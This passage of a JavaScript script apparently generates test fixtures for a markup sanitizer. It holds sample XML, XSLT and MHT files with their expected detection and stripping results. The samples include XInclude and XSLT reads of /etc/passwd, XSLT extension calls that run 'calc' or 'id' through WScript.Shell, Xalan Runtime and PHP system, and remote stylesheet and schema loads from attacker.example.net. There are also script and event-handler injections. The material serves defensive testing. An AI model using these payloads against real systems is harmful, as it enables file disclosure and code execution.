  'An XInclude that reads a local file as text, with a fallback',
  '<?xml version="1.0"?>\n<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"><xi:fallback>none</xi:fallback></xi:include><p>kept</p></r>\n',
  {
    inspect: { status: 'strippable', includes: ['XML/XINCLUDE'] },
    disarm: { status: 'defused', absent: ['xi:include', '/etc/passwd', 'fallback'], present: ['<p>kept</p>'] },
  },
);

add(
  'xml-stylesheet-instruction.xml',
  'An xml-stylesheet instruction that loads an XSLT transform from another server',
  '<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="https://attacker.example.net/t.xsl"?>\n<r>data</r>\n',
  {
    inspect: { status: 'strippable', includes: ['EXTERNAL/STYLESHEET'] },
    disarm: { status: 'defused', absent: ['xml-stylesheet', 'attacker.example.net'] },
  },
);

add(
  'xml-stylesheet-relative.xml',
  'An xml-stylesheet instruction that loads a CSS file beside the document, kept, and one that loads an XSLT transform beside it, removed',
  '<?xml version="1.0"?>\n<?xml-stylesheet type="text/css" href="style.css"?>\n<?xml-stylesheet type="text/xsl" href="view.xsl"?>\n<r>data</r>\n',
  {
    inspect: { status: 'strippable', includes: ['EXTERNAL/RELATIVE', 'EXTERNAL/STYLESHEET'] },
    disarm: { status: 'defused', present: ['href="style.css"'], absent: ['view.xsl'] },
  },
);

add(
  'xml-html-reading.xml',
  'Data XML without namespaces whose script, image handler and click handler run if an HTML reader opens it; an attribute that only starts like a handler stays',
  '<?xml version="1.0"?>\n<items><item online="yes">one</item><script>alert(1)</script><img src="x.png" onerror="alert(2)"/><item onclick="alert(3)">two</item></items>\n',
  {
    inspect: { status: 'strippable', format: 'xml', includes: ['SCRIPT/ELEMENT', 'SCRIPT/EVENT_HANDLER', 'EXTERNAL/RELATIVE'] },
    disarm: { status: 'defused', absent: ['<script', 'onerror', 'onclick', 'alert('], present: ['<item online="yes">one</item>'] },
  },
);

add(
  'xml-malformed.xml',
  'A file that declares XML but is not well-formed, so a browser reads it as a page, where its script runs',
  '<?xml version="1.0"?>\n<r><p>unclosed<script>alert(1)</script></r>\n',
  {
    inspect: { status: 'strippable', format: 'html', includes: ['XML/MALFORMED', 'SCRIPT/ELEMENT'] },
    disarm: { status: 'defused', absent: ['<script', 'alert('] },
  },
);

add(
  'xml-latin1.xml',
  'A document in ISO-8859-1, which the output declares as UTF-8',
  Buffer.concat([Buffer.from('<?xml version="1.0" encoding="ISO-8859-1"?>\n<r>caf', 'latin1'), Buffer.from([0xe9]), Buffer.from('</r>\n', 'latin1')]),
  {
    inspect: { status: 'clean', encoding: 'windows-1252' },
    disarm: { status: 'clean', present: ['<?xml version="1.0" encoding="UTF-8"?>', '<r>caf\u00e9</r>'] },
  },
);

add(
  'xml-utf16.xml',
  'A UTF-16LE document with a byte order mark',
  Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<?xml version="1.0" encoding="UTF-16"?>\n<r>\u00e9t\u00e9</r>\n', 'utf16le')]),
  {
    inspect: { status: 'clean', encoding: 'utf-16le' },
    disarm: { status: 'clean', present: ['encoding="UTF-8"', '<r>\u00e9t\u00e9</r>'] },
  },
);

add('xml-unknown-encoding.xml', 'An encoding no reader here knows, so the file is read as a page', '<?xml version="1.0" encoding="X-NOT-AN-ENCODING"?>\n<r>text</r>\n', {
  inspect: { status: 'strippable', format: 'html', includes: ['XML/ENCODING'] },
  disarm: { status: 'defused', present: ['<r>text</r>'] },
});

// ---------- XSLT ----------

const xsl = (ns, body) => `<?xml version="1.0"?>\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"${ns}>\n${body}\n</xsl:stylesheet>\n`;

add(
  'xslt-msxsl-script.xsl',
  'An msxsl:script block that a .NET or MSXML processor runs, and a call to the function it defines',
  xsl(
    ' xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:user"',
    '<msxsl:script language="JScript" implements-prefix="user">function run(){ return new ActiveXObject("WScript.Shell").Run("calc"); }</msxsl:script>\n<xsl:template match="/"><xsl:value-of select="user:run()"/></xsl:template>',
  ),
  {
    inspect: { status: 'strippable', risk: 'CRITICAL', format: 'xslt', includes: ['XSLT/SCRIPT', 'XSLT/EXTENSION_FUNCTION'] },
    disarm: { status: 'defused', absent: ['msxsl:script', 'ActiveXObject', 'user:run'], present: ['<xsl:template match="/">'] },
  },
);

add(
  'xslt-java-extension.xsl',
  'A Xalan Java extension call that starts a program',
  xsl(
    ' xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"',
    '<xsl:template match="/"><xsl:variable name="r" select="rt:getRuntime()"/><xsl:value-of select="rt:exec($r, \'calc\')"/></xsl:template>',
  ),
  {
    inspect: { status: 'strippable', includes: ['XSLT/EXTENSION_FUNCTION'] },
    disarm: { status: 'defused', absent: ['rt:exec', 'rt:getRuntime'] },
  },
);

add(
  'xslt-php-function.xsl',
  "A call to PHP's function bridge",
  xsl(' xmlns:php="http://php.net/xsl"', '<xsl:template match="/"><xsl:value-of select="php:function(\'system\', \'id\')"/></xsl:template>'),
  {
    inspect: { status: 'strippable', includes: ['XSLT/EXTENSION_FUNCTION'] },
    disarm: { status: 'defused', absent: ['php:function'] },
  },
);

add(
  'xslt-document.xsl',
  'Expressions that read other files and an environment variable',
  xsl(
    '',
    '<xsl:template match="/"><xsl:copy-of select="document(\'file:///etc/passwd\')"/><out a="{unparsed-text(\'/etc/hosts\')}"/><xsl:value-of select="concat(\'document(\', \'x\')"/></xsl:template>',
  ),
  {
    inspect: { status: 'strippable', includes: ['XSLT/DOCUMENT'] },
    disarm: { status: 'defused', absent: ['/etc/passwd', 'unparsed-text'], present: ["concat('document(', 'x')"] },
  },
);

add(
  'xslt-include.xsl',
  'An import and an include of stylesheets from elsewhere',
  xsl('', '<xsl:import href="https://attacker.example.net/a.xsl"/>\n<xsl:include href="b.xsl"/>\n<xsl:template match="/">ok</xsl:template>'),
  {
    inspect: { status: 'strippable', includes: ['XSLT/INCLUDE'] },
    disarm: { status: 'defused', absent: ['xsl:import', 'xsl:include', 'attacker.example.net'], present: ['ok'] },
  },
);

add(
  'xslt-write-files.xslt',
  'A result-document and an extension element that write files, beside a function the stylesheet defines itself',
  `<?xml version="1.0"?>\n<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" xmlns:f="urn:local" extension-element-prefixes="exsl">\n<xsl:function name="f:double"><xsl:param name="n"/><xsl:sequence select="$n * 2"/></xsl:function>\n<xsl:template match="/"><xsl:result-document href="file:///tmp/out.txt">x</xsl:result-document><exsl:document href="/tmp/o2.txt">y</exsl:document><xsl:value-of select="f:double(2)"/></xsl:template>\n</xsl:stylesheet>\n`,
  {
    inspect: { status: 'strippable', includes: ['XSLT/RESULT_DOCUMENT', 'XSLT/EXTENSION_ELEMENT'], excludes: ['XSLT/EXTENSION_FUNCTION'] },
    disarm: { status: 'defused', absent: ['result-document', 'exsl:document', '/tmp/'], present: ['f:double(2)'] },
  },
);

add(
  'xslt-clean.xsl',
  'A stylesheet that uses only node-set() from EXSLT and MSXML',
  xsl(
    ' xmlns:exsl="http://exslt.org/common" xmlns:msxsl="urn:schemas-microsoft-com:xslt"',
    '<xsl:template match="/"><xsl:variable name="v"><a/></xsl:variable><xsl:value-of select="count(exsl:node-set($v)) + count(msxsl:node-set($v))"/></xsl:template>',
  ),
  {
    inspect: { status: 'clean', format: 'xslt' },
    disarm: { status: 'clean', present: ['exsl:node-set($v)'] },
  },
);

add(
  'xslt-result-markup.xsl',
  'Instructions that put script in the result: an element and attributes named on the instruction, text written as markup, and a character map',
  `<?xml version="1.0"?>\n<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n<xsl:output-character character="~" string="&lt;script&gt;alert(1)&lt;/script&gt;"/>\n<xsl:template match="/"><xsl:text disable-output-escaping="yes">&lt;!DOCTYPE html&gt;</xsl:text><xsl:element name="script">alert(2)</xsl:element><xsl:element name="p">kept</xsl:element><a><xsl:attribute name="onclick">alert(3)</xsl:attribute><xsl:attribute name="href">javascript:alert(4)</xsl:attribute><xsl:attribute name="title">kept title</xsl:attribute></a><xsl:text disable-output-escaping="yes">&lt;img src=x onerror=alert(5)&gt;</xsl:text><xsl:value-of select="." disable-output-escaping="yes"/></xsl:template>\n</xsl:stylesheet>\n`,
  {
    inspect: { status: 'strippable', format: 'xslt', includes: ['XSLT/UNESCAPED_OUTPUT', 'SCRIPT/ELEMENT', 'SCRIPT/EVENT_HANDLER', 'SCRIPT/URL'] },
    disarm: {
      status: 'defused',
      absent: ['output-character', 'alert(2)', 'alert(3)', 'alert(4)', 'escaping="yes">&lt;img'],
      present: [
        '<xsl:element name="p">kept</xsl:element>',
        'kept title',
        'disable-output-escaping="yes">&lt;!DOCTYPE html&gt;',
        '<xsl:text>&lt;img src=x onerror=alert(5)&gt;</xsl:text>',
        '<xsl:value-of select="."/>',
      ],
    },
  },
);

add(
  'xslt-dynamic.xsl',
  'XSLT 3.0 instructions that evaluate an expression built at run time, read other documents and load a package, and EXSLT script',
  `<?xml version="1.0"?>\n<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:func="http://exslt.org/functions" xmlns:my="urn:my" extension-element-prefixes="func">\n<xsl:use-package name="urn:pkg"/>\n<func:script implements-prefix="my" language="javascript">function f(){}</func:script>\n<func:function name="my:twice"><xsl:param name="n"/><func:result select="$n * 2"/></func:function>\n<xsl:template match="/"><xsl:evaluate xpath="string(.)"/><xsl:source-document href="other.xml"><x/></xsl:source-document><xsl:value-of select="my:twice(2)"/></xsl:template>\n</xsl:stylesheet>\n`,
  {
    inspect: { status: 'strippable', format: 'xslt', includes: ['XSLT/EVALUATE', 'XSLT/DOCUMENT', 'XSLT/INCLUDE', 'XSLT/SCRIPT'], excludes: ['XSLT/EXTENSION_FUNCTION'] },
    disarm: { status: 'defused', absent: ['xsl:evaluate', 'source-document', 'use-package', 'func:script'], present: ['my:twice(2)', '<func:function name="my:twice">'] },
  },
);

add(
  'xml-stylesheet-decoy.xml',
  'xml-stylesheet instructions whose pseudo-attributes hide a remote style sheet or an XSLT transform behind a decoy, removed, beside a well-formed one kept',
  `<?xml version="1.0"?>\n<?xml-stylesheet title="href='a.css'" type="text/css" href="https://evil.example.net/x.css"?>\n<?xml-stylesheet a-href="b.css" type="text/css" href="https://evil.example.net/y.css"?>\n<?xml-stylesheet title="type='text/css'" type="text/xsl" href="view.xsl"?>\n<?xml-stylesheet type="text/css" href="&#x68;ttps://evil.example.net/z.css"?>\n<?xml-stylesheet type="text/css" href="site.css"?>\n<r>data</r>\n`,
  {
    inspect: { status: 'strippable', format: 'xml', includes: ['EXTERNAL/STYLESHEET', 'EXTERNAL/RELATIVE'] },
    disarm: { status: 'defused', present: ['href="site.css"'], absent: ['evil.example.net', 'view.xsl', '&#x68;'] },
  },
);

add(
  'xml-schema-relative.xml',
  'Schema locations beside the document, in an attribute and in an xml-model instruction, kept, and one whose path climbs out, removed',
  `<?xml version="1.0"?>\n<?xml-model href="schemas/s.rng"?>\n<r xmlns="urn:r" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="urn:r r.xsd"><x xsi:noNamespaceSchemaLocation="a/../../x.xsd">t</x></r>\n`,
  {
    inspect: { status: 'strippable', format: 'xml', includes: ['EXTERNAL/RELATIVE', 'EXTERNAL/PATH_TRICK'] },
    disarm: { status: 'defused', present: ['href="schemas/s.rng"', 'xsi:schemaLocation="urn:r r.xsd"'], absent: ['x.xsd'] },
  },
);

add(
  'xml-schema-location.xml',
  'Schema locations a validating parser fetches, in an attribute and in an xml-model instruction, beside a schema on www.w3.org',
  `<?xml version="1.0"?>\n<?xml-model href="https://attacker.example.net/s.rng"?>\n<r xmlns="urn:r" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="urn:r https://attacker.example.net/r.xsd"><x xsi:noNamespaceSchemaLocation="http://www.w3.org/2001/xml.xsd">kept</x></r>\n`,
  {
    inspect: { status: 'strippable', format: 'xml', includes: ['XML/SCHEMA_LOCATION'] },
    disarm: { status: 'defused', absent: ['attacker.example.net', 'xml-model'], present: ['xsi:noNamespaceSchemaLocation="http://www.w3.org/2001/xml.xsd"'] },
  },
);

add(
  'xml-model-decoy.xml',
  'xml-model instructions whose pseudo-attributes hide a remote schema behind a decoy, removed, beside a schema beside the document, kept',
  `<?xml version="1.0"?>\n<?xml-model title="href='s.rng'" href="https://attacker.example.net/a.rng"?>\n<?xml-model a-href="s.rng" href="https://attacker.example.net/b.rng"?>\n<?xml-model href="s.rng"href="https://attacker.example.net/c.rng"?>\n<?xml-model href="schemas/s.rng"?>\n<r>t</r>\n`,
  {
    inspect: { status: 'strippable', format: 'xml', includes: ['XML/SCHEMA_LOCATION', 'EXTERNAL/RELATIVE'] },
    disarm: { status: 'defused', present: ['href="schemas/s.rng"'], absent: ['attacker.example.net'] },
  },
);

// ---------- MHT ----------

const qp = s => s.replace(/=/g, '=3D');
const mht = (headers, parts, epilogue = '') =>
  `MIME-Version: 1.0\r\n${headers}\r\n\r\nThis is a multi-part message in MIME format.\r\n\r\n${parts.map(p => `--b1\r\n${p}\r\n`).join('')}--b1--\r\n${epilogue}`;

add(
  'mht-basic.mht',
  'A saved page: an HTML part with a script and an image that names another part, the image, and a style sheet part with expression()',
  mht('Content-Type: multipart/related; boundary="b1"; type="text/html"', [
    `Content-Type: text/html; charset="utf-8"\r\nContent-Transfer-Encoding: quoted-printable\r\nContent-Location: file:///C:/page.htm\r\n\r\n${qp('<html><head><link rel="stylesheet" href="page_files/s.css"></head><body><img src="page_files/i.png"><script>alert(1)</script><p>saved</p></body></html>')}`,
    `Content-Type: image/png\r\nContent-Transfer-Encoding: base64\r\nContent-Location: file:///C:/page_files/i.png\r\n\r\n${PNG}`,
    'Content-Type: text/css\r\nContent-Location: file:///C:/page_files/s.css\r\n\r\np { color: red; width: expression(alert(2)) }',
  ]),
  {
    inspect: { status: 'strippable', format: 'mht', includes: ['SCRIPT/ELEMENT', 'STYLE/EXPRESSION', 'EMBEDDED/NO_PLUGIN'] },
    disarm: { status: 'defused', present: ['Content-Transfer-Encoding: base64', 'Content-Location: file:///C:/page_files/s.css'] },
  },
);

add(
  'mht-hidden-data.mht',
  'Markup outside the parts, before the first boundary and after the last',
  `MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b1"\r\n\r\n<script>alert(1)</script>\r\n--b1\r\nContent-Type: text/html\r\n\r\n<p>part</p>\r\n--b1--\r\n<script>alert(2)</script>\r\n`,
  {
    inspect: { status: 'strippable', includes: ['MHT/HIDDEN_DATA'] },
    disarm: { status: 'defused', absent: ['<script'] },
  },
);

add(
  'mht-nested.mht',
  'A multipart/alternative inside the related body, with a start parameter that names the second part',
  `MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b1"; start="<root@x>"\r\n\r\n--b1\r\nContent-Type: multipart/alternative; boundary="b2"\r\n\r\n--b2\r\nContent-Type: text/plain\r\n\r\nplain text\r\n--b2\r\nContent-Type: text/html\r\nContent-ID: <root@x>\r\n\r\n<p onclick="alert(1)">html</p>\r\n--b2--\r\n--b1--\r\n`,
  {
    inspect: { status: 'strippable', includes: ['SCRIPT/EVENT_HANDLER'] },
    disarm: { status: 'defused', present: ['multipart/alternative'] },
  },
);

add(
  'mht-single-body.mht',
  'An HTML page saved with MIME headers and one body',
  `MIME-Version: 1.0\r\nContent-Type: text/html; charset="us-ascii"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n<html><body><iframe src="https://example.net/"></iframe><p>body</p></body></html>\r\n`,
  {
    inspect: { status: 'strippable', format: 'mht', includes: ['EMBEDDED/IFRAME'] },
    disarm: { status: 'defused' },
  },
);

add(
  'mht-undecodable.mht',
  'A part in a transfer encoding no reader here decodes',
  mht('Content-Type: multipart/related; boundary="b1"', [
    'Content-Type: text/html\r\n\r\n<p>root</p>',
    'Content-Type: application/octet-stream\r\nContent-Transfer-Encoding: x-uuencode\r\n\r\nbegin 644 a\r\n`\r\nend',
  ]),
  {
    inspect: { status: 'strippable', includes: ['EMBEDDED/NO_PLUGIN'] },
    disarm: { status: 'defused', absent: ['x-uuencode'] },
  },
);

add('mht-no-parts.mht', 'MIME headers that name a multipart body with no parts', 'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b1"\r\n\r\nnothing here\r\n', {
  inspect: { status: 'rejected', risk: 'UNKNOWN', includes: ['MHT/MALFORMED'] },
  disarm: { status: 'rejected' },
});

// ---------- not markup ----------

add('text-only.html', 'Text with no markup at all, which a browser shows as a page', 'Just some text & more.\nNo markup here.\n', {
  inspect: { status: 'clean', format: 'html' },
  disarm: { status: 'clean', present: ['Just some text &amp; more.'] },
});

add('not-markup.bin', 'Binary content with no markup, which this package does not read', Buffer.from([0x00, 0x01, 0x02, 0x03, 0x41, 0x42, 0x00, 0xff, 0xfe, 0x00]), {
  inspect: { status: 'rejected', risk: 'UNKNOWN', includes: ['FORMAT/UNRECOGNIZED'] },
  disarm: { status: 'rejected' },
});

// Characters outside ASCII are written as JSON escapes, so the manifest is ASCII like the other text files.
const json = JSON.stringify(manifest, null, 2).replace(/[\u0080-\uffff]/g, c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`);
fs.writeFileSync(path.join(dir, 'manifest.json'), `${json}\n`);
console.log(`${Object.keys(manifest).length} fixtures in ${path.relative(process.cwd(), dir)}`);
